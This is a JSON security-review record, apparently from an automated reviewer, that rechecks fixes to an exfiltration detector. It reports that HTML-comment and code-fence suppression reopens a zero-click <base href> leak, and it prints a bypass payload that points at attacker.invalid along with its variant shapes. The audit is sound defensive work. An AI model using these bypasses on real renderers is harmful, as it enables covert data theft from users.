@@ -1,0 +1,229 @@
+{
+  "contract_version": "1.0.0",
+  "run_id": "T62-recheck-2026-09-06",
+  "dispatch_id": "T62",
+  "status": "DONE_WITH_CONCERNS",
+  "summary": "Independent recheck of the last five repairs of phase 233 (T60, T61, T63, T64, T65). All six Stage 1 rows reproduce as closed under probes written and executed here, each measured at a real call site rather than at a pure function. Stage 1 nevertheless FAILS on the judgement call attached to row 6: T63's new suppression of a <base href> finding inside a 'closed' HTML comment or fenced code block is a live bypass of the zero-click exfiltration floor. Six payloads a renderer parses as a live <base href> produce zero findings; four of them are adjudicated by Bun's HTMLRewriter (lol-html), an independent HTML tokenizer, and confirmed leaking attacker.invalid at dispatchCallTool, prepareOutputForPersistence, validateOutputForTransport and redactToolOutput with redaction.state 'none' and an empty reasons array. Five bytes ('<!-->') are enough. The isolation T63 offered (revisit fencedCodeBlockSpans alone) is not sufficient: three of the four boundary-confirmed leaks are in the HTML-comment half. Ruling: revert both halves of nonRenderedSpans and the <base> guard, keep T63's disclosure work, restore T53's standing ruling. Three minor residuals recorded (the MODE_RANK/behaviour ordering still writes a false 'enforcement weakened' incident for gateway->enforced; the newly guarded disabled-policy arm suppresses a true section-14 signal for the unrecognized-mode shape; the prose classifying gateway is stale and one sentence is affirmatively false) plus two info. Every prior measurement holds: 88-case extraction, 615 resolutions, the 42-, 48- and 240-case matrices, the canonicalization and persistence boundary rows, and the T39 posture/exit matrices, all byte-identical. Focused suites 196 pass / 0 fail; typecheck clean. src/security/detect/exfil.ts drifted mid-review under the concurrent worker; every affected measurement was re-run and is byte-identical across the drift.",
+  "summary_markdown": null,
+  "acceptance": [
+    {
+      "criterion": "AC4 (AFC-05), AC5 (AFC-15) and AC8: no required failed or incomplete check is relabeled PASS at any surface including the process exit code and the recorded completion row; an optional warning is never signed as passed in a durable record; no field-name or spelling bypass; no durable record asserts something that did not happen.",
+      "status": "partial",
+      "evidence": "The relabeling half is MET and measured: a warn health gate is distinguishable in the stored flow.json ('done: all gates passed (health gate: warn)') and in the published issue comment ('health gate: warn') while a genuine pass stays byte-identical to the pre-fix constant (T62-flow.log R01/R02/R99, driven through the production healthGate wiring and the captured tracker.comment argument); gateway now exits non-zero at scan, report, check-input and check-output for fail/needs-approval/incomplete/unrecognized (T62-mode.log M1); every malformed stored health report folds to the module's own no-report refusal at all four readers with zero throws (T62-health.log H01-H22). AC5 (AFC-15) is NOT met: T62#F-001 is a field-shape bypass of the base-href egress class, six shapes, four confirmed leaking at all four public boundaries (T62-boundary.log SUMMARY hostileLeakingAtAnyBoundary 4). AC8's durable-record clause is met for the health and completion paths and violated in one low-reachability place, T62#F-002 (a mode-downgrade incident asserting 'enforcement weakened' for gateway->enforced, a transition measured to weaken nothing)."
+    },
+    {
+      "criterion": "Every prior measurement holds: the extraction, resolution, forty-two case, forty-eight case and character-reference matrices, and the boundary rows for the canonicalization and persistence repairs.",
+      "status": "met",
+      "evidence": "T53-extract 88 cases 0 bypasses with an identical 14-id over-approximation set; T53-resolve 41x15=615, 0 bypasses 0 false positives; T42-exfil-attack 42 cases 0/0; T24-recheck2-exfil 48 cases 0/0; T42-charrefs 48 names x 5 shapes = 240 cases, no named or numeric spelling bypass; T24-recheck2-boundary all 12 canonicalization shapes and all 28 MCP persistence cases keeping their exact state and reason token; T42-boundary ROW 1 six formerly-leaking shapes closed and ctlPublicLink state none; T52-base 14 cases notNeutralized [] falsePositives []; T39-posture, T39-exit and T39-scan reproducing cell for cell with gateway's four exit cells the one intended move. Every one re-run again after the mid-review drift with byte-identical output. Raw logs T62-rerun-*.log and T62-postdrift-*.log."
+    },
+    {
+      "criterion": "Every verdict row cites an executed probe with a raw log path under /Users/Goodea/goodea/keryx/.metaproject/data/gdctx/raw/.",
+      "status": "met",
+      "evidence": "Stage 1 rows 1-6 cite T62-flow.log, T62-state.log, T62-mode.log, T62-health.log (rows 4 and 5) and T62-exfil.log respectively; the judgement call cites T62-exfil.log and T62-boundary.log; every re-run control cites a T62-rerun-*.log or T62-postdrift-*.log path with its SHA-256 in the Evidence table (36 rows)."
+    }
+  ],
+  "artifacts": [
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T62-review.md",
+      "kind": "review",
+      "exists": true,
+      "summary": "Independent recheck of T60/T61/T63/T64/T65; Stage 1 fails on the <base> inert-span suppression.",
+      "hash": "7ebfcb9098aeba8c6e1a95d15a5f01d2d13d63ffeebf23b0b03111afe6567b84"
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T62-flow.ts",
+      "kind": "custom",
+      "exists": true,
+      "summary": "Row 1 probe: real health service + captured published comment + stored flow.json.",
+      "hash": "bbf59ad1fb6495dd0e162722ddb2afa67aab0cdd684b5888b217f752421bd7bd"
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T62-state.ts",
+      "kind": "custom",
+      "exists": true,
+      "summary": "Row 2 probe: both self-protection arms at analyze(), 22-row mode matrix plus policy arm.",
+      "hash": "031c34fc9c0bf19a51352646664ff9b17c64996580c30e7691abbf6a7ec376ea"
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T62-mode.ts",
+      "kind": "custom",
+      "exists": true,
+      "summary": "Row 3 probe: 4 modes x 4 command surfaces, 2 seams, 12 rank pairs.",
+      "hash": "3f05e22cc681ba5621bebe818049ef88dabf8f37a36ea8631f4ec4d8ca0fbbf4"
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T62-health.ts",
+      "kind": "custom",
+      "exists": true,
+      "summary": "Rows 4 and 5 probe: 16 shapes x 4 readers, 9 configs, real health run().",
+      "hash": "8e525cc49fc60e05b7d298a238c5a0bddb4bc9ac073f0d41a84eceda342b904e"
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T62-exfil.ts",
+      "kind": "custom",
+      "exists": true,
+      "summary": "Row 6 judgement call: 13 inert-span cases adjudicated by lol-html / CommonMark.",
+      "hash": "39e8555467016b1ddac12f98b045c4b6be1790a85224e81dd18f7af32fcb82c7"
+    },
+    {
+      "path": ".metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T62-boundary.ts",
+      "kind": "custom",
+      "exists": true,
+      "summary": "F-001 at dispatchCallTool, prepareOutputForPersistence, validateOutputForTransport, redactToolOutput.",
+      "hash": "a9e29d3ea4428aff4f1fa152d60f5da942e11205cd74bb0d4c25f912b606628a"
+    },
+    {
+      "path": ".metaproject/data/gdctx/raw/T62-boundary.log",
+      "kind": "custom",
+      "exists": true,
+      "summary": "Four hostile shapes leaking attacker.invalid at all four public boundaries with redaction.state none.",
+      "hash": "2f98d4b84b11f671e490464e5ccf08c7dfd515914a2deb9e2aa0b114655dcf32"
+    },
+    {
+      "path": ".metaproject/data/gdctx/raw/T62-exfil.log",
+      "kind": "custom",
+      "exists": true,
+      "summary": "13 inert-span cases, 6 bypasses, lol-html oracle.",
+      "hash": "aced49a50b17d7b225b61567d98cf811f8a34789bd042c800599e2095fdbed2a"
+    }
+  ],
+  "changed_files": [],
+  "findings": [
+    {
+      "id": "F-001",
+      "global_id": "T62#F-001",
+      "reviewer": "review-security-code+review-logic (T62)",
+      "severity": "blocker",
+      "file": "src/security/detect/exfil.ts",
+      "line": 729,
+      "symbol": "nonRenderedSpans",
+      "problem": "T63's new rule suppresses an egress.html-base-href-exfil finding when the <base> tag falls inside a span this code judges CLOSED, as an HTML comment (/<!--[\\s\\S]*?-->/) or a CommonMark fenced code block (a left-to-right pairing of fence-marker lines). Both approximations are wrong in the direction that suppresses. (1) HTML_COMMENT_SPAN recognizes only `-->`; the HTML tokenizer also closes a comment at `<!-->` and `<!--->` (abrupt-closing-of-empty-comment) and at `--!>` (comment-end-bang), each of which ends the comment BEFORE the attacker's <base> while the regex swallows it. (2) fencedCodeBlockSpans pairs fence lines with no awareness of any other block context, and nonRenderedSpans computes fence spans and comment spans independently of each other, so a fence marker quoted inside a comment (or comment delimiters quoted inside a fence or a code span) opens a span the renderer does not have. The stated bound - only a span with BOTH delimiters present counts - forecloses the unterminated-delimiter abuse but is not the property that makes suppression safe: a matching pair of THIS code's delimiters is not evidence that a renderer draws a span between them, and every bypass supplies such a pair.",
+      "impact": "AC5 (AFC-15) and the phase's own 'no new bypass' criterion fail: the zero-click <base href> exfiltration channel that took five rounds to close is reopened for five bytes. `<!--><base href=\"https://attacker.invalid/x/\">...-->` produces ZERO findings and leaves the attacker's document base in the released text, re-pointing every relative URL in the document so that each relative image fires a zero-click GET carrying the surrounding path. It is a complete release, not a partial one: at dispatchCallTool, prepareOutputForPersistence, validateOutputForTransport and redactToolOutput all four report redaction.state \"none\" with an empty reasons array, so the caller is not even told anything was considered. Blast radius is whole-document, per T53#F-001.",
+      "suggested_fix": "Revert both halves of nonRenderedSpans and the guard at the <base> branch; keep T63's disclosure work (the asymmetry comment and BASE_REMEDIATION), which is correct and is what T53#F-001 actually asked for. Reverting only fencedCodeBlockSpans - the isolation T63 offered - is NOT sufficient: it removes x07 but leaves x01/x02/x03, three of the four boundary-confirmed leaks, in the HTML-comment half. Reverting only the comment half leaves x07. If context detection is wanted later it needs a real HTML tokenizer and a real CommonMark pass (the discipline readStartTag already applies to attributes), must fail toward flagging on every ambiguity rather than only on an unterminated delimiter, and its acceptance evidence must include hostile payloads placed inside every span kind it recognizes - T63's evidence measured only benign content being removed from the finding list.",
+      "evidence": "bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T62-boundary.ts, raw .metaproject/data/gdctx/raw/T62-boundary.log (sha256 2f98d4b84b11f671e490464e5ccf08c7dfd515914a2deb9e2aa0b114655dcf32), advisory redaction OFF: {\"label\":\"SUMMARY\",\"hostileLeakingAtAnyBoundary\":4,\"ids\":[\"abruptEmptyComment\",\"abruptDashComment\",\"commentEndBang\",\"fencePairSwallowsLiveBase\"]}, each with mcpState \"none\", mcpReasons [], persistState \"none\", transportState \"none\", leaksHost {mcp:true,persist:true,transport:true,seam:true}. Controls in the same run: plainHostileBase and unterminatedComment both redacted with [\"egress.html-base-href-exfil\"] and leaking nothing; T63's two benign suppression targets byte-identical. bun .../T62-exfil.ts, raw T62-exfil.log (sha256 aced49a50b17d7b225b61567d98cf811f8a34789bd042c800599e2095fdbed2a) adjudicates the renderer question with Bun's HTMLRewriter (lol-html), an independent spec-derived tokenizer: rows x01, x02, x03 and x07 all report lolHtmlLiveBaseHref \"https://attacker.invalid/x/\" with baseFindings 0; two further shapes (x05, x06) bypass under the markdown-with-passthrough model this file's header commits to. Summary {\"cases\":13,\"bypasses\":6}. Both logs byte-identical before and after the concurrent worker's mid-review edit to exfil.ts.",
+      "confidence": "high",
+      "dedupe_key": "afc15:exfil:base-inert-span-suppression-bypass",
+      "blocking_merge": true,
+      "related_skill": "review-security-code",
+      "learning_candidate": true,
+      "class_scope": {
+        "sites": [
+          "src/security/detect/exfil.ts:729",
+          "src/security/detect/exfil.ts:730",
+          "src/security/detect/exfil.ts:736",
+          "src/security/detect/exfil.ts:763",
+          "src/security/detect/exfil.ts:773",
+          "src/security/detect/exfil.ts:942"
+        ],
+        "enumeration_method": "bun src/cli.ts ctx rg -n \"fencedCodeBlockSpans|nonRenderedSpans|isInNonRenderedSpan|getNonRenderedBaseSpans|HTML_COMMENT_SPAN|FENCE_LINE\" src/security/detect/exfil.ts (raw 2026-09-06T17-11-01-582Z_rg.log pre-drift, 2026-09-06T17-27-43-994Z_rg.log post-drift) enumerated every site of the new mechanism - six definitions and one consumer, the tag===\"base\" branch - each read in full. Line numbers are post-drift; pre-drift equivalents are :568, :569, :575, :602, :612, :745. The bypass set was derived from the HTML Standard's comment states (comment-start, comment-start-dash, comment-end-bang, comment-end) and CommonMark's fenced-code and HTML-block rules, one payload per state, each adjudicated by lol-html where the pure-HTML tokenizer decides and by the named CommonMark rule where markdown decides, then driven through all four real public boundaries rather than through detectExfil alone."
+      }
+    },
+    {
+      "id": "F-002",
+      "global_id": "T62#F-002",
+      "reviewer": "review-security-code+review-logic (T62)",
+      "severity": "minor",
+      "file": "src/security/self-protect.ts",
+      "line": 39,
+      "symbol": "MODE_RANK / evaluateSelfProtection",
+      "problem": "T61 resolved the gateway disagreement in the BLOCKING direction but not in the ORDERING direction. After T61 and T65, gateway is behaviourally identical to enforced and ci at every site that branches on the mode (isBlockingMode guard.ts:237, reportExitCode commands/security.ts:683, exitCodeFor :972) - measured cell for cell at four command surfaces and both module seams. MODE_RANK nevertheless gives gateway 3 and enforced/ci 2, so reconfiguring gateway -> enforced (or -> ci) appends a durable mode-downgrade entry to the append-only incidents.jsonl with the message 'Mode changed from gateway to enforced' and the warning '(enforcement weakened)'. Nothing was weakened. This is T57#F-002's shape - a durable record asserting something that did not happen - on the readable-config path, which T61's !config.configUnreadable guard by construction does not cover. T61's cited reason for holding the table fixed is partly circular: the regressions it defers to (T58 D2, and T61 D1 which T61 wrote itself) were authored under the ranking they are cited to justify, and T61 corrected exactly such a committed expectation on the other axis (guard.test.ts's {mode:\"gateway\", blocks:false} row).",
+      "impact": "Fail-loud noise in the audit trail, not a bypass: no check is relabeled and nothing is let through. A false entry in the append-only trail erodes the signal a real mode-downgrade carries. Reachability is low - gateway is still documented as unimplemented (T62#F-004) and is unlikely to be set today.",
+      "suggested_fix": "Rank gateway at 2 alongside enforced and ci for as long as it has no behaviour of its own; gateway -> advisory stays a downgrade (the only one true today) and advisory -> gateway stays silent. T58 D2's gateway -> ci pin then encodes a claim the code no longer makes and should be corrected in writing, the way T61 corrected guard.test.ts's row. If the ranking is deliberately forward-looking for Phase 4, keep it and change the wording instead: an incident and a warning asserting 'enforcement weakened' must not fire for a transition that weakens nothing.",
+      "evidence": "bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T62-mode.ts, raw .metaproject/data/gdctx/raw/T62-mode.log (sha256 81c0e7046acc951880a9f0f5be3362b7f02e95f9bc22771caf3f960c28191ca8). M3 drives all 12 ordered pairs of recognized modes through the real analyze() and reads incidents.jsonl back: {\"from\":\"gateway\",\"to\":\"enforced\",\"downgradeDetected\":true} and {\"from\":\"gateway\",\"to\":\"ci\",\"downgradeDetected\":true}. M2 in the same run: gateway, ci and enforced all give guardAllowed:false and flowGateStatus \"fail\" with no 'informational' shortcut. M1: identical exit codes for gateway/ci/enforced across 11 gate x surface cells at scan, report, check-input and check-output, with advisory 0 everywhere.",
+      "confidence": "high",
+      "dedupe_key": "security-mode-rank-vs-behaviour-false-downgrade-incident",
+      "blocking_merge": false,
+      "related_skill": "gdskills/orchestration/task-implementer",
+      "learning_candidate": true
+    },
+    {
+      "id": "F-003",
+      "global_id": "T62#F-003",
+      "reviewer": "review-security-code+review-logic (T62)",
+      "severity": "minor",
+      "file": "src/security/self-protect.ts",
+      "line": 123,
+      "symbol": "evaluateSelfProtection (disabled-policy arm)",
+      "problem": "T61 extended T58's !config.configUnreadable guard from the mode arm to the disabled-policy arm, on the stated ground that 'a forced/derived config's policies (defaults, for a fully-unusable payload) are not an operator's choice either'. That is true for one broken shape and false for the other. For an unusable payload the policies ARE the defaults (all enabled), so no policy-disabled comparison could fire anyway and the guard is a no-op. For an UNRECOGNIZED MODE, loadSecurityConfig returns {...merged, mode:'enforced', configUnreadable:true} and merged carries the operator's real parsed policies - config.ts:228-233 says so explicitly. So a policy the operator genuinely disabled in that same file produces no warning and no incident, although the statement would have been true of their own bytes. Section 14's stated invariant, 'a mode downgrade or a disabled policy is always surfaced (warn + incident)' (self-protect.ts:14-18), is silent for the window and silent forever if the mode typo is never repaired.",
+      "impact": "Not a bypass and not a false record - an omission, not an assertion, so AC8 is not violated. Enforcement during the window is maximally strict (guardOutput and securityFlowGate refuse everything through their posture-unavailable branches), so the disabled policy buys nothing while it lasts, and detection resumes on the next readable run. The cost is that a self-protection control which promises to always surface an operator's change can be silenced by a four-byte edit to a neighbouring field, and that the reason recorded beside the guard is not the reason it is safe.",
+      "suggested_fix": "Narrow the guard to the shape it was argued for. The loader already distinguishes the two cases (mergeSecurityConfig({}) for an unusable payload vs {...merged, ...} for an unrecognized mode); carrying that distinction - a second flag, or comparing config.policies against the defaults - lets the policy arm keep running for the unrecognized-mode shape while staying silent for the derived one. At minimum correct the comment: for the unrecognized-mode shape the policies are the operator's choice, and the arm is guarded for convenience, not because the statement would be untrue.",
+      "evidence": "bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T62-state.ts, raw .metaproject/data/gdctx/raw/T62-state.log (sha256 d573be65110b7f2af9ab6256b006a9c2f3d45909ccc167d4d42f52e06325bce4), measured at analyze(): B0 control (readable config, promptInjection disabled) -> incidents [\"policy-disabled\"], warnings [\"security policy \\\"promptInjection\\\" was disabled.\"]. B1 (unrecognized mode + the same real disable in one file) -> incidentsDuringWindow [], warningsDuringWindow [], trueDisableSuppressedDuringWindow true, detectedOnceRepaired true. B2 (never repaired, 3 runs) -> incidents [], realDisableEverRecorded false. B3 (unusable payload) -> incidentsDuringWindow [], confirming the guard is a no-op for that shape.",
+      "confidence": "high",
+      "dedupe_key": "self-protect-policy-arm-guard-suppresses-true-signal",
+      "blocking_merge": false,
+      "related_skill": "gdskills/orchestration/task-implementer",
+      "learning_candidate": false
+    },
+    {
+      "id": "F-004",
+      "global_id": "T62#F-004",
+      "reviewer": "review-security-code+review-logic (T62)",
+      "severity": "minor",
+      "file": "docs/docs/cli-reference.md",
+      "line": 2096,
+      "symbol": "security module documentation",
+      "problem": "docs/docs/cli-reference.md:2096 states 'Model/API backends and gateway mode (Phase 4) are not implemented.' After T61 and T65, gateway is a fully enforcing posture: it blocks the write seam, fails flow completion, and exits non-zero at security scan, report, check-input and check-output. Every surrounding prose enumeration of which modes block still reads 'advisory ... enforced/ci block' and omits gateway - src/security/templates.ts:62-64 and :124 (written into the operator's own project by keryx init/update as agent-facing rules), .metaproject/modules/security.md:48, docs/docs/architecture.md:547,563, docs/docs/modules.md:865,874,881, docs/docs/workspace-and-lifecycle.md:339,350 and docs/docs/cli-reference.md:330,754,912,993,1058. T65's enumeration covered src/commands/security.ts exhaustively and correctly but did not look outside that file; the residual is disclosed in neither T61 nor T65.",
+      "impact": "An operator reading the reference would believe setting mode: gateway is inert and instead get the strictest posture the tool has - blocked writes, a failing flow gate and non-zero exits at four commands. The reverse mistake is worse: templates.ts's text is the guidance an agent reads inside the target project, and it tells that agent gateway is not one of the modes that refuse.",
+      "suggested_fix": "Correct cli-reference.md:2096 (gateway's blocking behaviour is implemented; only its Phase-4 proxy behaviour is not) and add gateway to the 'enforced/ci block' enumerations, src/security/templates.ts first because it ships into user projects.",
+      "evidence": "bun src/cli.ts ctx rg -n '\"gateway\"' src (raw .metaproject/data/gdctx/raw/2026-09-06T17-09-14-745Z_rg.log): six production sites, all now blocking. bun src/cli.ts ctx rg -n 'enforced.*ci|advisory.*enforced' docs .metaproject/modules src/security/templates.ts (raw 2026-09-06T17-17-18-491Z_rg.log): the prose enumeration above. Behaviour measured in .metaproject/data/gdctx/raw/T62-mode.log rows M1 and M2.",
+      "confidence": "high",
+      "dedupe_key": "security-gateway-prose-classification-stale",
+      "blocking_merge": false,
+      "related_skill": "gdskills/orchestration/task-implementer",
+      "learning_candidate": false
+    },
+    {
+      "id": "F-005",
+      "global_id": "T62#F-005",
+      "reviewer": "review-security-code (T62)",
+      "severity": "info",
+      "file": "src/health/run.ts",
+      "line": 240,
+      "symbol": "SourceRunInfo.error -> computeGate -> HealthReport.gate.reasons",
+      "problem": "Three sites in src/health/run.ts (:240, :275, :297) build a source's `error` by interpolating a caught error.message. computeGate (gate.ts:78-79) interpolates that into `INCOMPLETE: required source unavailable: ${source.source}${detail}`, which is persisted into .metaproject/data/health/artifacts/latest.json (a committable artifact) and, through healthGateOutcome's incomplete/fail arms, into flow.json's completion-failed history entry. A caught error.message from a spawned tool or a file read routinely carries an absolute path. This sits directly beside the constant, non-interpolated CONFIG_UNREADABLE_REASON T64 added, which is exactly right; its neighbours in the same array are not held to the same bar.",
+      "impact": "None demonstrated: the two error strings I could reach in a synthetic fixture are fixed phrases ('dependency audit JSON parse failed', and the absent-source case with no detail), so no payload carrying a filesystem path was constructed. Recorded because the whole phase turns on durable records carrying only constant, leak-safe reasons, and this is the one path into those records that is not constant. Pre-existing; introduced by none of the five repairs under review.",
+      "suggested_fix": "Give the three run.ts sites a constant category the way dependency-audit.ts and eslint.ts already do, or keep source.error out of the string computeGate serialises into reasons. Track separately - it is outside every row of this dispatch.",
+      "evidence": "bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T62-health.ts row G32 (raw .metaproject/data/gdctx/raw/T62-health.log) shows a source error reaching a gate reason at the real entry point createCodeHealthService().run(). bun .../T62-flow.ts rows S03/S04 (raw T62-flow.log) show the health module's reasons reaching flow.json history verbatim (leakedSecret true for a string planted in reasons). bun src/cli.ts ctx rg -n 'error: ' src/health/sources src/health/run.ts src/health/service.ts (raw 2026-09-06T17-22-00-830Z_rg.log) enumerates three interpolating sites against nine constant ones.",
+      "confidence": "medium",
+      "dedupe_key": "health-source-error-interpolated-into-durable-gate-reasons",
+      "blocking_merge": false,
+      "related_skill": "review-security-code",
+      "learning_candidate": true
+    },
+    {
+      "id": "F-006",
+      "global_id": "T62#F-006",
+      "reviewer": "review-logic (T62)",
+      "severity": "info",
+      "file": "src/health/config.ts",
+      "line": 146,
+      "symbol": "loadHealthConfig (present-unusable branch)",
+      "problem": "T64 section 5 argues that leaving metrics.coverageSoftFloor at the default 'reopened the exact bug T59 closed, narrowed to this one field'. The premise about the field is right; the consequence is not reachable. The same branch forces gate.failOnRegressionDrop to 0, and computeGate escalates on regression >= config.gate.failOnRegressionDrop with regression defaulting to 0, so an unusable config produces 'FAIL: health regression 0 vs baseline' unconditionally, before coverage is read, and the gate is already fail. Forcing coverageSoftFloor to 100 therefore adds a WARN line to reasons and can never change status.",
+      "impact": "None. The change is correct in direction and harmless; the argument recorded for it overstates what it buys, which is the failure mode this phase has flagged repeatedly (a sound rule with an unsound stated reason). It also means T64's acceptance row 'the verdicts themselves are unchanged' is true for a reason T64 does not give.",
+      "suggested_fix": "State in the branch's comment that the forcing is defence in depth against a future change to failOnRegressionDrop, not a currently-reachable verdict change. Optionally note that nothing validates coverageSoftFloor, so the 'every legal value is <= 100' claim rests on convention rather than enforcement.",
+      "evidence": "bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T62-health.ts rows G20 (raw .metaproject/data/gdctx/raw/T62-health.log, sha256 ee63c9298bc92e1b6b632d324a5d7ab18e8c7b5c0a301b823272f2281ee9792a): all six unusable configs x four coverage values (absent, 41, 70, 100) yield status \"fail\" with 'FAIL: health regression 0 vs baseline' always present; the soft-floor WARN line appears at 41 and 70 and is absent at 100 and when coverage is absent, with status identical in all four. Row G40 shows a config declaring coverageSoftFloor 150 is accepted by the loader with no validation, and the forced config is still at least as strict at the status level for the same reason.",
+      "confidence": "high",
+      "dedupe_key": "health-coverage-softfloor-forcing-inert-under-its-own-branch",
+      "blocking_merge": false,
+      "related_skill": "gdskills/orchestration/task-implementer",
+      "learning_candidate": false
+    }
+  ],
+  "questions": [],
+  "errors": [],
+  "metrics": {
+    "duration_ms": null,
+    "prompt_tokens": null,
+    "output_tokens": null,
+    "retries": null,
+    "probes_written": 6,
+    "probes_rerun": 16,
+    "stage1_rows": 6,
+    "stage1_rows_closed": 6,
+    "bypasses_found": 6,
+    "bypasses_confirmed_at_all_four_boundaries": 4,
+    "focused_tests_pass": 196,
+    "focused_tests_fail": 0
+  },
+  "timestamp_utc": "2026-09-06T17:35:00Z"
+}
